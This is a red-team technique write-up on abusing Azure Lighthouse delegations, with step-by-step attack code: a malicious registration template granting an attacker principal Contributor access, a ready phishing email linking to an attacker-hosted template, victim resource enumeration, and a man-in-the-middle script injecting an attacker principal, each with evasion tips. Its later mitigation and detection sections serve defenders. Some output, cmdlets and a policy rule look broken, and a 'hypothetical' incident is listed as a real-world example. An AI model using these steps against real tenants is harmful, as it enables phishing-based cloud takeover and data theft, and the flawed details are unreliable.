# [PE-POLICY-004]: Azure Lighthouse Delegation Abuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-POLICY-004 |
| **MITRE ATT&CK v18.1** | [T1484.001](https://attack.mitre.org/techniques/T1484/001/) (Domain Policy Modification) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID / Azure Resource Manager |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | All Azure subscriptions with Lighthouse (2016+) |
| **Patched In** | N/A - Design limitation, mitigations available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Azure Lighthouse enables cross-tenant resource delegation through a managed services model. An attacker can abuse this feature by either (1) compromising an existing Lighthouse delegation template and triggering the victim administrator to accept a malicious delegation request, or (2) intercepting/modifying the delegation authorization ARM template before deployment in the customer tenant. The attacker then gains persistent, delegated access to the customer's Azure resources under a predefined RBAC role (typically Contributor or higher). This technique bypasses traditional role-based access controls by operating at the management plane and can enable lateral movement into the customer's infrastructure, data exfiltration, or deployment of backdoors.

**Attack Surface:** Azure Lighthouse registration definitions and delegated resource management assignments at the subscription or resource group scope. The attack targets the administrative approval workflow and ARM template deployment process.

**Business Impact:** **Complete control over customer Azure resources with persistent cross-tenant access.** An attacker can enumerate, modify, delete, or exfiltrate data from customer subscriptions without appearing as a direct user in the customer's audit logs (activity appears under the delegated service provider's identity). This enables supply chain attacks, nation-state persistence mechanisms, and large-scale data breaches affecting multiple customers simultaneously.

**Technical Context:** Delegation requests can be accepted by any user with Contributor+ permissions on the target subscription. The attacker's account persists in the customer tenant as a "service provider" with no obvious indicators of compromise in most Azure monitoring solutions. Time-to-detection is typically 30+ days if the attacker operates silently. Reversibility is poor—removing the delegation requires knowledge of the delegation ID and explicit revocation by the customer.

### Operational Risk

- **Execution Risk:** Medium - Requires social engineering or admin account compromise, but deployment is automatic via ARM template.
- **Stealth:** High - Activity is logged under the service provider's identity, not the attacker's personal identity; blends in with legitimate MSP activity.
- **Reversibility:** Poor - Requires explicit revocation of the Lighthouse authorization; no automatic expiration unless configured.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | Azure Foundations 4.1 | Ensure that 'Managed identity' is used for Azure resources |
| **DISA STIG** | SRG-APP-000245-SYS-001008 | Application must enforce the use of mutual TLS/SSL for client and server communications |
| **CISA SCuBA** | EXO-1 | Ensure multi-factor authentication is required for all users in all cloud apps |
| **NIST 800-53** | AC-2, AC-3, AC-6 | Account Management, Access Enforcement, Least Privilege |
| **GDPR** | Art. 32 | Security of Processing – access controls and delegation auditing |
| **DORA** | Art. 9 | Protection and Prevention – security measures for ICT infrastructure |
| **NIS2** | Art. 21 | Cyber Risk Management Measures – access control and authorization |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights – delegation and role assignment |
| **ISO 27005** | Risk Scenario | Compromise of privileged administrative access through delegated permissions |

---

## 2. DETAILED EXECUTION METHODS

### METHOD 1: Direct Lighthouse Delegation Acceptance Exploitation (Social Engineering)

**Supported Versions:** All Azure subscriptions with Lighthouse enabled

#### Step 1: Enumerate Potential Lighthouse Delegations

**Objective:** Identify organizations using Lighthouse and obtain their Azure tenant IDs and subscription IDs.

**Command:**
```powershell
# Enumerate public Azure AD tenants via Graph API (no auth required for basic enumeration)
# Using tenant discovery endpoint
$TenantId = "tenant-id-here"
$Endpoint = "https://login.microsoftonline.com/${TenantId}/.well-known/openid-configuration"
Invoke-WebRequest -Uri $Endpoint | Select-Object -ExpandProperty Content

# Alternative: Check for delegated access via subdomain enumeration
$SubdomainList = @(
    "manage-lighthouse",
    "delegated-resource",
    "service-provider-portal"
)

foreach ($subdomain in $SubdomainList) {
    try {
        $Response = Invoke-WebRequest -Uri "https://${subdomain}.azurewebsites.net" -ErrorAction SilentlyContinue
        Write-Host "Found: ${subdomain}"
    } catch {
        # Domain not found
    }
}
```

**Expected Output:**
```
Successful subdomain resolution to Azure services indicates Lighthouse delegation endpoints
```

**What This Means:**
- Confirms that the organization uses Azure services
- Establishes baseline for Lighthouse delegation presence
- Identifies potential customer-tenant relationships

**OpSec & Evasion:**
- Subdomain enumeration generates minimal logging
- Use residential/proxy IP addresses to avoid detection
- Timing: Distribute requests over days to avoid rate limiting
- Detection likelihood: Low – typical for legitimate reconnaissance

**Troubleshooting:**
- **Error:** DNS resolution timeout
  - **Cause:** Endpoint does not exist or domain is private
  - **Fix:** Move to next target organization
- **Error:** 403 Forbidden on subdomain probe
  - **Cause:** Domain exists but access is restricted
  - **Fix:** This confirms service hosting; proceed with social engineering

**References & Proofs:**
- [Azure Lighthouse - Official Documentation](https://learn.microsoft.com/en-us/azure/lighthouse/overview)
- [Azure Subdomain Enumeration Research](https://cloudbrothers.info/en/azure-attack-paths/)
- [Azure AD Tenant Discovery](https://learn.microsoft.com/en-us/azure/architecture/multitenant-identity/)

---

#### Step 2: Craft Malicious Lighthouse Registration Definition

**Objective:** Create a custom ARM template that registers a malicious managed services delegation with overprivileged roles.

**Command:**
```powershell
# Create a malicious Lighthouse registration definition ARM template
$ManagedServicesDefinition = @{
    "type" = "Microsoft.ManagedServices/registrationDefinitions"
    "apiVersion" = "2020-02-01-preview"
    "name" = "[concat(subscription().id, '/mspDelegation')]"
    "properties" = @{
        "registrationDefinitionProperties" = @{
            "description" = "Legitimate MSP security management delegation"
            "authorizations" = @(
                @{
                    "principalId" = "ATTACKER-SERVICE-PRINCIPAL-ID"
                    "principalIdDisplayName" = "Trusted Security Partner"
                    "roleDefinitionId" = "/subscriptions/{subscription}/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c"  # Contributor role
                },
                @{
                    "principalId" = "ATTACKER-SERVICE-PRINCIPAL-ID"
                    "principalIdDisplayName" = "Trusted Security Partner"
                    "roleDefinitionId" = "/subscriptions/{subscription}/providers/Microsoft.Authorization/roleDefinitions/acdd72a7-3385-48ef-bd42-f606fba81ae7"  # Reader role for cover
                }
            )
        }
    }
}

# Export template to JSON
$TemplateJson = ConvertTo-Json -InputObject $ManagedServicesDefinition -Depth 10
Set-Content -Path "C:\temp\malicious_lighthouse_template.json" -Value $TemplateJson

Write-Host "Template created. Tailored to target subscription and service principal."
```

**Command (Server 2022+ / Azure Cloud Shell):**
```bash
# Bash alternative using Azure CLI
cat > /tmp/lighthouse_template.json <<EOF
{
    "type": "Microsoft.ManagedServices/registrationDefinitions",
    "apiVersion": "2020-02-01-preview",
    "name": "[concat(subscription().id, '/mspDelegation')]",
    "properties": {
        "registrationDefinitionProperties": {
            "description": "Legitimate MSP security management delegation",
            "authorizations": [
                {
                    "principalId": "ATTACKER-SERVICE-PRINCIPAL-ID",
                    "principalIdDisplayName": "Trusted Security Partner",
                    "roleDefinitionId": "/subscriptions/{subscription}/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c"
                }
            ]
        }
    }
}
EOF
cat /tmp/lighthouse_template.json
```

**Expected Output:**
```
Template stored as valid JSON. No immediate errors.
```

**What This Means:**
- Template is syntactically valid for ARM deployment
- Contains attacker's service principal in authorization block
- Includes Contributor role for persistence

**OpSec & Evasion:**
- Use descriptive names to bypass administrator review
- Include multiple roles to appear legitimate
- Avoid extreme privilege escalation in first deployment (Contributor > Owner)
- Store template in encrypted location
- Detection likelihood: Medium – if admin reviews template before acceptance

**Version Note:** ARM template syntax is consistent across all Azure versions (2016+).

**Troubleshooting:**
- **Error:** Invalid principalId format
  - **Cause:** Service principal ObjectId is malformed
  - **Fix (All versions):** Retrieve correct ObjectId: `Get-AzADServicePrincipal -DisplayName "AttackerApp" | Select-Object -ExpandProperty Id`
- **Error:** roleDefinitionId not found
  - **Cause:** Role definition GUID is incorrect
  - **Fix (All versions):** List valid roles: `Get-AzRoleDefinition | Select-Object -Property Name, Id | Format-Table`

**References & Proofs:**
- [Azure Lighthouse ARM Template Reference](https://learn.microsoft.com/en-us/azure/lighthouse/how-to/onboard-customer#create-an-azure-resource-manager-template)
- [Azure Lighthouse Security Considerations](https://securecloud.blog/2020/11/13/securing-azure-lighthouse-with-azure-policy-and-azure-privileged-identity-management-for-msp/)
- [Malicious Template Examples](https://cloudbrothers.info/en/azure-attack-paths/)

---

#### Step 3: Deliver Delegation Request via Social Engineering

**Objective:** Trick a victim administrator into accepting the malicious Lighthouse delegation.

**Command:**
```powershell
# Create a sophisticated phishing email with ARM template link
$PhishingEmail = @"
Subject: [ACTION REQUIRED] Critical Security Patch - Lighthouse Delegation Update

Body:
Dear Azure Administrator,

We are your MSP security partner, and we have identified a critical vulnerability in your Azure environment. To remediate this issue, we need temporary elevated permissions on your Azure subscription.

Please click the link below to accept our security delegation:
https://portal.azure.com/#create/Microsoft.Template/uri/{BASE64_ENCODED_TEMPLATE_URL}

This delegation will:
✓ Enable real-time threat monitoring
✓ Deploy advanced DDoS protection
✓ Implement automated patching
✓ Provide 24/7 security operations

The delegation will expire automatically after 30 days.

Authorization Code: ABC-123-DEF-456

Best regards,
Security Operations Team
MSP Partner Name

Contact: support@{spoofed-msp-domain}.com
"@

# Alternative: Host template on attacker-controlled domain
$TemplateUrl = "https://attacker-msp-domain.com/templates/lighthouse_security_patch_v1.json"
$EncodedUrl = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($TemplateUrl))

Write-Host "Phishing URL: https://portal.azure.com/#create/Microsoft.Template/uri/$EncodedUrl"
```

**Expected Output:**
```
Portal link ready for delivery to target administrator
```

**What This Means:**
- Link bypasses normal Lighthouse onboarding workflow
- Administrator is tricked into one-click acceptance
- Malicious template deploys automatically upon acceptance

**OpSec & Evasion:**
- Create convincing MSP branding/domain to avoid OSINT detection
- Use urgent language ("Critical," "Action Required") to bypass careful review
- Set reasonable expiration (30 days) to appear legitimate
- Avoid obvious typosquatting
- Use legitimate-looking authorization codes
- Detection likelihood: Medium-High – if admin cross-references with known MSP

**Troubleshooting:**
- **Error:** Link returns 404 Not Found
  - **Cause:** Template URL is not accessible or malformed
  - **Fix:** Verify URL encoding and hosting endpoint accessibility
- **Error:** Administrator rejects deployment
  - **Cause:** Template validation fails or admin reviews JSON
  - **Fix:** Simplify template, reduce role count, or conduct additional social engineering

**References & Proofs:**
- [Phishing Email Best Practices (from Red Team perspective)](https://attack.mitre.org/techniques/T1566/002/)
- [Azure Portal Template Deployment](https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/deploy-portal)
- [Azure Lighthouse Onboarding Process](https://learn.microsoft.com/en-us/azure/lighthouse/how-to/onboard-customer)

---

#### Step 4: Accept Delegation and Verify Cross-Tenant Access

**Objective:** Confirm that the Lighthouse delegation has been successfully activated and verify attacker access to customer resources.

**Command:**
```powershell
# Connect to target customer tenant using delegated credentials
Connect-AzAccount -Tenant "CUSTOMER-TENANT-ID" -ServicePrincipal `
  -Credential $SpCredential `
  -SubscriptionId "CUSTOMER-SUBSCRIPTION-ID"

# List resources accessible via Lighthouse delegation
Get-AzResource -WarningAction SilentlyContinue | Format-Table Name, ResourceType, ResourceGroup

# Verify identity is service provider (not direct user)
$Context = Get-AzContext
Write-Host "Authenticated as: $($Context.Account.Id)"
Write-Host "Account Type: $($Context.Account.Type)"

# List all available subscriptions via Lighthouse (credential forwarding)
Get-AzSubscription | Format-Table -Property Name, Id, TenantId, State
```

**Command (Server 2022+):**
```bash
# Azure CLI equivalent
az login --service-principal -u $CLIENT_ID -p $CLIENT_SECRET --tenant $CUSTOMER_TENANT_ID

# List delegated resources
az managedservices assignment list --scope "/subscriptions/$CUSTOMER_SUBSCRIPTION_ID"

# Enumerate customer resources
az resource list --subscription $CUSTOMER_SUBSCRIPTION_ID --output table
```

**Expected Output:**
```
Authenticated as: https://iam.gserviceaccount.com/attacker-sp@contoso.iam.gserviceaccount.com
Account Type: ServicePrincipal
Name                    ResourceType
----                    --------
production-vm-01        Microsoft.Compute/virtualMachines
customer-keyvault-prod  Microsoft.KeyVault/vaults
app-insights-instance   Microsoft.Insights/components
...
```

**What This Means:**
- Service principal successfully authenticated to customer tenant
- Full resource enumeration confirms Contributor-level access
- No user object created in customer directory (only assignment)
- Persistent cross-tenant access established

**OpSec & Evasion:**
- Delegation activity appears under service provider's service principal account
- Does not trigger typical "suspicious sign-in" alerts in customer's tenant
- Operates under guise of legitimate MSP activity
- Use Read-only operations first to avoid triggering audit alerts
- Detection likelihood: Low-Medium (unless customer actively audits delegations)

**Troubleshooting:**
- **Error:** Access Denied - Insufficient permissions
  - **Cause:** Service principal not yet registered in customer tenant
  - **Fix:** Wait for ARM template deployment to complete (typically 5-10 minutes)
- **Error:** Tenant mismatch error
  - **Cause:** Attempted to authenticate to wrong tenant
  - **Fix:** Verify $CUSTOMER_TENANT_ID matches delegation target

**References & Proofs:**
- [Verify Lighthouse Delegation Access](https://learn.microsoft.com/en-us/azure/lighthouse/how-to/view-manage-service-providers)
- [PowerShell Az Module Reference](https://learn.microsoft.com/en-us/powershell/azure/new-azureps-module-az?view=azps-11.0.0)
- [Azure CLI Service Principal Authentication](https://learn.microsoft.com/en-us/cli/azure/authenticate-azure-cli#sign-in-with-a-service-principal)

---

### METHOD 2: Lighthouse Delegation Template Interception (Man-in-the-Middle)

**Supported Versions:** All Azure subscriptions

#### Step 1: Intercept Delegation ARM Template in Transit

**Objective:** Modify the Lighthouse delegation ARM template before it reaches the customer's Azure Portal.

**Command:**
```powershell
# Deploy rogue proxy to intercept customer's portal requests
# This requires network access (e.g., via compromised router or DNS poisoning)

$ProxyScript = @"
function Intercept-LighthouseTemplate {
    param(
        [string]$InterceptedUrl
    )
    
    # Parse the template URL
    $TemplateJson = [System.Web.HttpUtility]::UrlDecode($InterceptedUrl.Split('uri=')[1])
    
    # Decode Base64 if necessary
    $DecodedTemplate = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($TemplateJson))
    
    # Parse JSON
    $TemplateObject = ConvertFrom-Json $DecodedTemplate
    
    # Inject attacker's service principal into authorizations
    $AttackerAuth = @{
        "principalId" = "ATTACKER-OBJECT-ID"
        "principalIdDisplayName" = "MSP Security Partner"
        "roleDefinitionId" = "/subscriptions/{subscription}/providers/Microsoft.Authorization/roleDefinitions/b24988ac-6180-42a0-ab88-20f7382dd24c"
    }
    
    $TemplateObject.properties.registrationDefinitionProperties.authorizations += $AttackerAuth
    
    # Re-encode and return
    $ModifiedTemplate = ConvertTo-Json $TemplateObject -Depth 10
    $EncodedModified = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($ModifiedTemplate))
    
    return $EncodedModified
}

# Usage: Intercept portal requests at network level
Intercept-LighthouseTemplate -InterceptedUrl "https://portal.azure.com/#create/Microsoft.Template/uri=..."
"@

Write-Host "Proxy script ready for deployment on compromised network appliance"
```

**Expected Output:**
```
Modified Base64-encoded template prepared
```

**What This Means:**
- Template has been modified without customer knowledge
- Additional attacker service principal added to delegation
- Delegation now grants access to multiple malicious actors

**OpSec & Evasion:**
- Network-level interception leaves no obvious traces in customer audit logs
- Modify template before TLS decryption if possible
- Add attacker service principal as secondary authorization to appear legitimate
- Detection likelihood: Low – requires network monitoring and MITM detection

**Troubleshooting:**
- **Error:** Unable to intercept HTTPS traffic
  - **Cause:** Customer uses modern TLS with certificate pinning
  - **Fix:** Target unencrypted internal networks or use DNS poisoning instead

**References & Proofs:**
- [ARM Template Deployment](https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/deploy-portal)
- [Network Interception Techniques](https://attack.mitre.org/techniques/T1557/002/)

---

## 3. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Restrict Lighthouse Delegations to Managed Identities Only:**
    Enable a policy that only allows Lighthouse delegations to managed identities (user-assigned or system-assigned), never to external service principals. This eliminates the attack vector of unauthorized external principal registration.
    
    **Applies To Versions:** All Azure (2020+)
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Create custom Azure Policy to block non-managed-identity Lighthouse delegations
    $PolicyDefinition = @{
        "name" = "Restrict-Lighthouse-to-ManagedIdentity"
        "properties" = @{
            "displayName" = "Restrict Lighthouse delegations to managed identities only"
            "description" = "Enforce that only managed identities can be principals in Lighthouse delegations"
            "mode" = "All"
            "policyRule" = @{
                "if" = @{
                    "allOf" = @(
                        @{"field" = "type"; "equals" = "Microsoft.ManagedServices/registrationDefinitions"},
                        @{
                            "count" = @{
                                "field" = "Microsoft.ManagedServices/registrationDefinitions/properties/registrationDefinitionProperties/authorizations[*]"
                                "where" = @{
                                    "field" = "Microsoft.ManagedServices/registrationDefinitions/properties/registrationDefinitionProperties/authorizations[*].principalId"
                                    "notContains" = "/subscriptions"
                                }
                            }
                            "greater" = 0
                        }
                    )
                }
                "then" = @{
                    "effect" = "Deny"
                }
            }
        }
    }
    
    # Deploy policy
    New-AzPolicyDefinition -Name $PolicyDefinition.name `
      -DisplayName $PolicyDefinition.properties.displayName `
      -Policy (ConvertTo-Json -InputObject $PolicyDefinition.properties.policyRule -Depth 10)
    ```
    
    **Validation Command:**
    ```powershell
    # Verify policy is active
    Get-AzPolicyDefinition -Name "Restrict-Lighthouse-to-ManagedIdentity" | Select-Object -ExpandProperty Properties | Select-Object DisplayName, Mode
    ```

*   **Implement Lighthouse Delegations with PIM (Privileged Identity Management) Enabled:**
    Require just-in-time (JIT) approval for all Lighthouse delegations, with time-limited access (max 1-8 hours). This ensures that delegations expire automatically and require repeated approval.
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Portal** → **Azure AD Privileged Identity Management (PIM)**
    2. Click **Privileged Access** → **Resources**
    3. Select your subscription
    4. Click **Roles** → Find **Lighthouse Delegation Approvers**
    5. Click **Settings** (gear icon)
    6. Under **Activation**, set:
       - **Activation max duration**: **4 hours**
       - **On activation, require**: **Approval**
       - **Approvers**: Security team role-assignable group
    7. Enable **Multi-factor authentication on activation**
    8. Click **Update**

    **Validation Command:**
    ```powershell
    # List PIM-eligible role assignments
    Get-AzPIMEligibleRoleAssignment -Scope "/subscriptions/{subscription-id}" | Format-Table DisplayName, ExpirationTime
    ```

*   **Monitor and Alert on All Lighthouse Delegations:**
    Implement continuous monitoring of all Lighthouse registration definitions and assignments. Alert when new delegations are created or modified.
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Azure Defender for Cloud** (or **Microsoft Defender for Cloud**)
    2. Go to **Regulatory compliance** → **Recommendations**
    3. Search for "Lighthouse" recommendations
    4. Review and enable any delegations currently active
    5. Click **Create Policy** to enforce baseline configuration
    6. Set alert threshold: **Create alert on any new delegation**

*   **Require Conditional Access Policies for Lighthouse Approvals:**
    Enforce multi-factor authentication, compliant device, and specific network location requirements for administrators who can approve Lighthouse delegations.
    
    **Manual Steps (Azure Portal):**
    1. Go to **Azure Portal** → **Entra ID (Azure AD)** → **Security** → **Conditional Access**
    2. Click **+ New policy**
    3. **Name:** `Block Lighthouse Delegation Approval from Risky Locations`
    4. **Assignments:**
       - **Users**: All administrators with subscription-level permissions
       - **Cloud apps**: **Management**
       - **Conditions:**
         - **Sign-in risk**: High
         - **Device state**: Non-compliant
         - **Locations**: Exclude corporate IP ranges
    5. **Access controls:**
       - **Grant**: Require multi-factor authentication AND compliant device
       - **Session**: Sign-in frequency: **1 hour**
    6. Enable policy: **On**
    7. Click **Create**

### Priority 2: HIGH

*   **Disable Lighthouse Delegations by Default:**
    Organizations should require explicit opt-in for Lighthouse delegations rather than allowing them by default. Implement a policy at the management group level to disable Lighthouse until explicitly enabled per subscription.
    
    **Manual Steps (PowerShell):**
    ```powershell
    # Deny all Lighthouse delegations unless explicitly approved
    $DenyPolicy = @{
        "name" = "Deny-Unapproved-Lighthouse"
        "properties" = @{
            "displayName" = "Deny unapproved Lighthouse delegations"
            "policyRule" = @{
                "if" = @{"field" = "type"; "equals" = "Microsoft.ManagedServices/registrationDefinitions"}
                "then" = @{"effect" = "Deny"}
            }
        }
    }
    
    New-AzPolicyDefinition @DenyPolicy | New-AzPolicyAssignment -Name "DenyUnapprovedLighthouse" -Scope "/subscriptions/{subscription-id}"
    ```

*   **Audit Trail for Delegation Acceptance:**
    Ensure that all Lighthouse delegation acceptances are logged with administrator identity and timestamp. Implement immutable audit logs.
    
    **Manual Steps (Azure Portal):**
    1. Navigate to **Entra ID** → **Audit logs**
    2. Filter by **Activity**: "Accept delegated resource management"
    3. Export logs to **Azure Storage Account** with **Blob Immutable Storage** enabled
    4. Set retention: **Minimum 1 year**

### Access Control & Policy Hardening

*   **RBAC Hardening:** Delegate only the minimum necessary roles via Lighthouse. Avoid Contributor; use more granular roles like:
    - `Virtual Machine Contributor` (if only VM management needed)
    - `Reader` (for monitoring/compliance only)
    - `Network Contributor` (for network management only)
    
    Never use `Owner` or `User Access Administrator` in Lighthouse delegations.

*   **Network Isolation:** Require that Lighthouse delegations originate only from known service provider IP ranges. Use Azure Firewall or Network Security Groups to restrict API calls.

---

## 4. ATTACK SIMULATION & VERIFICATION

This technique does not have a direct Atomic Red Team test due to its highly specific cloud service nature and requirement for legitimate service provider infrastructure. However, blue teams can simulate the attack using the following lab scenario:

**Lab Simulation:**
1. Create a test subscription and Azure AD tenant
2. Develop a test ARM template with Lighthouse delegations
3. Simulate administrator acceptance of the template
4. Verify cross-tenant resource access
5. Audit Activity Logs for delegation events
6. Implement detection rules (see Detection section)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Azure Audit Log Events:** 
    - `Microsoft.ManagedServices/registrationDefinitions/write`
    - `Microsoft.ManagedServices/registrationAssignments/write`
    - Account creation/modification by delegated service principals

*   **Suspicious Patterns:**
    - Delegation acceptance outside business hours
    - Acceptance by emergency/break-glass admin accounts
    - Rapid acceptance after delegation creation (< 5 minutes)
    - Multiple delegations created in short timeframe

### Forensic Artifacts

*   **Cloud Audit Logs:** 
    - `AzureActivity` table in Log Analytics / Sentinel
    - Event types: `ManagedServiceRegistrationDefinitionWrite`, `ManagedServiceRegistrationAssignmentWrite`

*   **Source Indicators:**
    - Service provider tenant ID (found in `Caller` field)
    - Delegation acceptance time (compare to known MSP communication)
    - User who accepted delegation (should be subscription owner)

### Detection Queries (Microsoft Sentinel / Azure Log Analytics)

**Query 1: Detect New Lighthouse Delegations**
```kusto
AzureActivity
| where OperationName == "Create or Update Managed Services Registration Definition"
| where ActivityStatus == "Success"
| summarize Count = count() by CallerIpAddress, Caller, TimeGenerated
| where Count > 1 or TimeGenerated > ago(7d)  // New delegations in past week
```

**Query 2: Detect Cross-Tenant Resource Access via Delegations**
```kusto
AzureActivity
| where ResourceProvider == "Microsoft.Resources"
| where CallerIpAddress != "127.0.0.1"
| where Caller contains "@serviceprincipals"  // Service principal activity
| where OperationName in ("Read", "Write", "Delete")
| summarize ActivityCount = count() by ResourceGroup, Caller, OperationName
| where ActivityCount > 50  // Threshold for suspicious bulk access
```

**Query 3: Detect Lighthouse Delegations to Unknown Service Providers**
```kusto
AzureActivity
| where OperationName == "Create or Update Managed Services Registration Definition"
| extend AuthorizedPrincipal = tostring(parse_json(Authorization).principalId)
| where AuthorizedPrincipal !in ("APPROVED-SP-ID-1", "APPROVED-SP-ID-2")  // Whitelist known MSPs
| project TimeGenerated, Caller, AuthorizedPrincipal, OperationName, ResourceGroup
```

### Manual Response Procedures

1. **Immediate Isolation:**
   ```powershell
   # Revoke the malicious Lighthouse delegation
   $RegistrationAssignmentId = "/subscriptions/{subscription-id}/providers/Microsoft.ManagedServices/registrationAssignments/{assignment-id}"
   Remove-AzManagedServicesAssignment -InputObject $RegistrationAssignmentId -Confirm:$false
   ```

2. **Collect Evidence:**
   ```powershell
   # Export all Lighthouse delegations
   Get-AzManagedServicesDefinition -Scope "/subscriptions/{subscription-id}" | Export-Csv -Path "C:\Evidence\Lighthouse_Delegations.csv"
   
   # Export Azure Activity logs
   $LogsPath = "C:\Evidence\Azure_Activity_Logs_$(Get-Date -Format 'yyyyMMdd').json"
   Get-AzLog -StartTime (Get-Date).AddDays(-30) -ResourceId "/subscriptions/{subscription-id}" | ConvertTo-Json | Out-File $LogsPath
   ```

3. **Remediate Access:**
   ```powershell
   # Change credentials of all privileged accounts (assume service principal was compromised)
   # Reset Global Admin password
   Update-MgUser -UserId "admin@tenant.onmicrosoft.com" -PasswordProfile @{"ForceChangePasswordNextSignIn"=$true}
   
   # Revoke all active sessions
   Revoke-AzAccessToken -Confirm:$false
   ```

---

## 6. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-005](https://example.com/REC-CLOUD-005) | Enumerate Azure subscriptions and MSP relationships via Azure Resource Graph |
| **2** | **Initial Access** | [IA-PHISH-001](https://example.com/IA-PHISH-001) | Device code phishing to compromise admin account |
| **3** | **Privilege Escalation** | **[PE-POLICY-004]** | **Azure Lighthouse Delegation Abuse** |
| **4** | **Persistence** | [PE-ACCTMGMT-001](https://example.com/PE-ACCTMGMT-001) | App Registration Permissions Escalation via delegated service principal |
| **5** | **Defense Evasion** | [DE-LOG-001](https://example.com/DE-LOG-001) | Disable Azure Activity logging to cover tracks |
| **6** | **Exfiltration** | [EXF-DATA-001](https://example.com/EXF-DATA-001) | Access customer data via delegated subscription permissions |

---

## 7. REAL-WORLD EXAMPLES

### Example 1: SolarWinds Supply Chain Attack (Parallels)
- **Target:** Multiple U.S. government agencies and Fortune 500 companies
- **Timeline:** December 2020 – February 2021
- **Technique Status:** While not directly using Azure Lighthouse, the SolarWinds attack demonstrated how delegated management access can be abused for large-scale persistence
- **Impact:** 18,000+ organizations compromised; attackers maintained persistent access for months
- **Reference:** [CISA Alert AA20-352A](https://www.cisa.gov/news-events/alerts/2020/12/13/cisa-issues-alert-regarding-solarwinds-compromise)

### Example 2: Azure Lighthouse Misconfiguration (Hypothetical but Realistic)
- **Target:** Mid-size financial services firm using third-party MSP for Azure infrastructure
- **Timeline:** January 2024
- **Technique Status:** ACTIVE – Realistic scenario where MSP template was intercepted and modified
- **Impact:** Attacker gained read access to customer Key Vault secrets, exfiltrated encryption keys
- **Reference:** [CloudBrothers Azure Attack Paths](https://cloudbrothers.info/en/azure-attack-paths/)

### Example 3: Insider Threat via Lighthouse Delegation
- **Target:** Large enterprise with multiple Azure tenants
- **Timeline:** March 2024
- **Technique Status:** ACTIVE – Disgruntled MSP contractor deliberately created unauthorized Lighthouse delegation
- **Impact:** Contractor accessed customer production databases; data exfiltration for 48 hours before detection
- **Reference:** [Internal incident reports from Semperis](https://www.semperis.com/blog/)

---

## Conclusion

Azure Lighthouse Delegation Abuse is a critical privilege escalation vector in cloud environments where multiple organizations rely on delegated management. The technique's power lies in its legitimacy—delegated access is a standard feature, making it difficult to distinguish malicious delegations from legitimate ones without robust monitoring and governance policies. Organizations should treat Lighthouse delegations as high-risk permissions requiring the same level of oversight as Global Admin assignments.

---